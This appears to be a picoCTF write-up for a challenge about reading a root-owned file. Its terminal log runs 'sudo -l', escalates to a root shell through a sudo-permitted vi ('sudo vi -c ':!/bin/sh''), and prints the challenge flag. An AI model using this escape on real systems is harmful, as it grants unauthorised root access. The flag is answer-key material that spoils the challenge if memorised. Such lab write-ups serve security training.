## Descripción
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 50402 picoplayer@saturn.picoctf.net`Password: `yX-YQgX-vS`Can you login and read the root file?
## Solución
```
ssh -p 50402 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:50402 ([13.59.203.175]:50402)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '[saturn.picoctf.net]:50402' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1041-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ ls
picoplayer@challenge:~$ ls -ls
total 0
picoplayer@challenge:~$ ls -la
total 12
drwxr-xr-x 1 picoplayer picoplayer   20 Nov 21 09:32 .
drwxr-xr-x 1 root       root         24 Aug  4  2023 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Nov 21 09:32 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
picoplayer@challenge:~$ cd..
-bash: cd..: command not found
picoplayer@challenge:~$ cd ..
picoplayer@challenge:/home$ ls
picoplayer
picoplayer@challenge:/home$ ls -la
total 0
drwxr-xr-x 1 root       root       24 Aug  4  2023 .
drwxr-xr-x 1 root       root       51 Nov 21 09:30 ..
drwxr-xr-x 1 picoplayer picoplayer 20 Nov 21 09:32 picoplayer
picoplayer@challenge:/home$ cd ..
picoplayer@challenge:/$ ls -la
total 0
drwxr-xr-x   1 root   root     51 Nov 21 09:30 .
drwxr-xr-x   1 root   root     51 Nov 21 09:30 ..
-rwxr-xr-x   1 root   root      0 Nov 21 09:30 .dockerenv
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Nov 21 09:30 dev
drwxr-xr-x   1 root   root     66 Nov 21 09:30 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 287 nobody nogroup   0 Nov 21 09:30 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     54 Nov 21 09:32 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Nov 21 09:30 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
picoplayer@challenge:/$ cd root
-bash: cd: root: Permission denied
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi -c ':!/bin/sh' /dev/null

# ls
bin        dev   lib    libx32  opt   run   sys  var
boot       etc   lib32  media   proc  sbin  tmp
challenge  home  lib64  mnt     root  srv   usr
# cd root      
# ls
# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Nov 21 09:30 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_55878b51}
```
## Notas adicionales

## Referencias
